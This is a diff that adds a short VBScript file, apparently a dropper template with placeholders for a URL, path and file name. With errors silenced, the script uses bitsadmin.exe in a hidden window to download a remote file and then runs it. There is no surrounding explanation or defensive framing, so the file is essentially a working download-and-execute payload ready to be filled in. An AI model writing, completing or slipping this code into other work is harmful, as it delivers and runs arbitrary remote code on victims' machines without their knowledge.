@@ -1,0 +1,5 @@
+on error resume next
+dim file
+file = "%pathh%" + "\%filename%"
+CreateObject("WScript.Shell").Run "bitsadmin.exe /transfer 8 %url% " + file,0, true
+CreateObject("WScript.Shell").Run file
